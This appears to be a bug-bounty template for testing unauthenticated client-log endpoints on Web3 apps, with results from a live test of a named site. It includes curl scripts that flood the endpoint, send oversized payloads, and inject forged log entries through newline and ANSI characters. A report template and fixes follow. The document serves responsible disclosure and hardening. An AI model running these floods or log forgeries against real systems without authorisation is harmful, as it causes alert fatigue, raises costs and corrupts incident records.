# Client-Log Endpoint Unrestricted Logging — Bug Class Template

Verified live on popi.wtf 2026-07-14. Reusable pattern for any Web3 dApp with a `/api/client-log`, `/api/error-report`, `/api/telemetry` endpoint.

## Detection

Look for these endpoint names in JS bundles:
```
grep -oE '"/api/(client-log|error-report|telemetry|log|report-error|frontend-log)"' js/*.js
```

Or trace `fetch()` calls that send `{level, message}` shape.

## Test Matrix (4 tests, all unauth)

### Test 1: Level whitelist bypass
```bash
for level in trace debug info warn error fatal panic emergency alert critical; do
  code=$(curl -sX POST https://TARGET/api/client-log \
    -H 'Content-Type: application/json' \
    -d "{\"level\":\"$level\",\"message\":\"probe\"}" \
    -o /dev/null -w '%{http_code}')
  echo "[$code] level=$level"
done
```

**Bug signal:** any level outside `{trace, debug, info, warn, error}` returns 200. `panic` / `fatal` / `emergency` accepted = alert-noise attack vector.

### Test 2: Rate limit check (compare to auth nonce baseline)
```bash
# Baseline: /api/auth/nonce typically 429s at ~20-30 req/min
# If /api/client-log accepts 30+ rapid without 429 = differential misconfig

for i in {1..30}; do
  curl -sX POST https://TARGET/api/client-log \
    -H 'Content-Type: application/json' \
    -d "{\"level\":\"error\",\"message\":\"flood $i\"}" \
    -o /dev/null -w '%{http_code} '
done
```

**Bug signal:** all 30 return 200 while `/api/auth/nonce` 429s in same window.

### Test 3: Control character / log injection
```bash
curl -X POST https://TARGET/api/client-log \
  -H 'Content-Type: application/json' \
  -d '{"level":"error","message":"\n[ERROR] fake admin log entry from user"}'

curl -X POST https://TARGET/api/client-log \
  -H 'Content-Type: application/json' \
  -d '{"level":"error","message":"\x1b[31mFAKE_RED_ALERT\x1b[0m"}'
```

**Bug signal:** 200 response, no error about invalid chars. Newlines preserve to downstream logger = attacker can forge structured log entries that mimic other systems.

### Test 4: Payload size cap
```bash
LARGE=$(python3 -c "print('A'*100000)")
curl -sX POST https://TARGET/api/client-log \
  -H 'Content-Type: application/json' \
  -d "{\"level\":\"error\",\"message\":\"$LARGE\"}" \
  -w '  size cap: %{http_code}\n' -o /tmp/r.txt
head -c 200 /tmp/r.txt
```

Expected: 413 Payload Too Large. If accepts 100KB+ = additional cost inflation vector.

## Report Template

Copy this, replace `TARGET`, add your PoC output:

```
FINDING: /api/client-log accepts arbitrary severity levels, no rate limit, no sanitization

Severity: Low-Medium (P4)

Affected: POST https://TARGET/api/client-log

Repro 1 — Level whitelist bypass:
[paste test 1 output showing all 200]

Repro 2 — No rate limit (baseline comparison to /api/auth/nonce):
[paste test 2 output showing all 200 vs auth/nonce 429s]

Repro 3 — Log injection via newline / ANSI:
[paste test 3 with newline preserved in response]

Impact:
- Alert-noise attack via fake panic/fatal events → alert fatigue on ops team
- Cost inflation on downstream observability (Sentry, Datadog) via flooding
- Log forgery: attackers can hide traces of separate attacks or mislead incident review
- Potential downstream XSS if any operator dashboard renders `message` field raw

Fix:
1. Whitelist level ∈ {trace, debug, info, warn, error}
2. Add per-IP rate limit matching /api/auth/nonce posture (~10-20 req/min)
3. Strip control characters (\n, \r, ANSI \x1b[) from all string fields
4. Cap message length to 2-4KB
5. HTML-escape strings before displaying in any operator dashboard

Reporter: @yourhandle
Wallet for reward: [your Solana wallet]
```

## Payout Range (as of 2026)

- Low-tier programs: $25-75 (report as informational hardening)
- Medium-tier programs: $75-250 (if you can prove downstream XSS or cost impact numerically)
- High-tier programs (Immunefi Web3): rarely accepted — they require direct-funds-loss impact

## Real Numbers (popi.wtf)

- All 30 rapid requests → 200
- All 7 severity levels tested → 200
- Newline `\n` preserved (not stripped)
- 100KB payload → 413 (size cap works)
- HTML/template payloads accepted (no XSS-input validation)
